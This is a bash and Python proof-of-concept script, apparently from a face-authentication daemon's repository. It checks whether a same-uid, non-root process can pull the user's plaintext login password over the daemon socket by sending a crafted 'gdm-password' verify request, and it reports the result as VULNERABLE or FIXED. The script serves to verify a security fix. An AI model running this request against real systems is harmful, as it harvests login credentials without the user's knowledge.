#!/usr/bin/env bash
#
# Proof of concept — H-2: silent login-password harvesting via the keyring
# release channel.
#
# Threat (before the fix): when `[keyring] enabled = true` and the user ran
# `hiro keyring set`, ANY process running with the target user's uid could
# send
#
#     Op::Verify { user: <self>, service: "gdm-password", want_keyring: true }
#
# over the world-connectable daemon socket. "gdm-password" sits in BOTH
# `approval.bypass_services` (no approval prompt appears) and
# `keyring.services` (release is allowed), and the daemon authorised by uid
# only — so the moment the user's face was in front of the camera, the
# daemon returned the user's PLAINTEXT login password to the requesting
# (attacker-controlled) process. No prompt, no notification.
#
# After the fix, the daemon releases the sealed password only to root
# callers (greeter/login stacks run as root), so this same request returns
# `keyring_password: null`.
#
# Usage:
#   ./scripts/poc-keyring-harvest.sh [socket]
#
# It does NOT need root. It requires a running hirod with the keyring
# feature enabled and a stored secret; if the face does not match (or the
# after-reboot gate blocks), the script reports that instead.
#
set -euo pipefail

SOCKET="${1:-/run/hirod/hirod.sock}"

if [ ! -S "$SOCKET" ]; then
    echo "error: no socket at $SOCKET (is hirod running?)" >&2
    exit 2
fi

user="$(id -un)"
uid="$(id -u)"

req() {
    # Send one request, read one response line.
    python3 - "$SOCKET" "$1" <<'PY'
import json, socket, sys
path, payload = sys.argv[1], sys.argv[2]
s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect(path)
s.sendall((payload + "\n").encode())
line = b""
while not line.endswith(b"\n"):
    chunk = s.recv(4096)
    if not chunk:
        break
    line += chunk
s.close()
print(line.decode().strip())
PY
}

echo "== H-2 PoC: keyring-password harvest via the daemon socket =="
echo "  caller : $user (uid=$uid)"
echo "  socket : $SOCKET"
echo

# 1. Trigger the same request malware would: verify for our own account on
#    a login service that (a) bypasses the approval prompt and (b) is in
#    keyring.services, explicitly asking for the login password.
echo "--- sending Op::Verify{user=$user, service=\"gdm-password\", want_keyring=true} ---"
resp="$(req "{\"v\":2,\"id\":1,\"op\":\"verify\",\"user\":\"$user\",\"service\":\"gdm-password\",\"timeout_ms\":5000,\"want_keyring\":true}")"
echo "daemon: $resp"
echo

# Parse the verdict properly: serde always emits keyring_password (null or
# the secret), so a plain grep on the field name is not enough.
python3 - "$resp" <<'PY'
import json, sys
try:
    data = json.loads(sys.argv[1])
except Exception as e:
    print(f"RESULT: cannot parse daemon response ({e})")
    sys.exit(2)

result = data.get("result") or {}
matched = result.get("matched", False)
password = result.get("keyring_password")
reason = result.get("reason")

if not matched:
    print(f"RESULT: no face match (reason={reason}) — the channel is exercised, but the")
    print("        password is only released on a match. Re-run while the enrolled")
    print("        user is in front of the camera.")
    sys.exit(0)

if password is not None:
    print("VULNERABLE: the daemon returned the plaintext login password to a")
    print(f"            non-root process: keyring_password={password!r}")
    sys.exit(1)

print("FIXED: face matched, but keyring_password is null — a same-uid process")
print("       cannot harvest the login password (release is root-only).")
sys.exit(0)
PY
